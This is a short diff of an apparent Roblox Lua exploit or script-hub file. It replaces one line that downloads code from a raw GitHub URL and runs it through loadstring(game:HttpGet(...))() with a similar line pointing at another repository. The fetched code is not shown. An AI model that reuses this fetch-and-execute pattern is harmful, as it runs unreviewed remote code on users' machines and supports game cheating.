@@ -143,6 +143,6 @@ local responce = request(
     })
 }
 )
-    loadstring(game:HttpGet"https://raw.githubusercontent.com/Raspelx/asayufga/main/e")()
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/Raspelx/-/main/b")()
 
 win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")
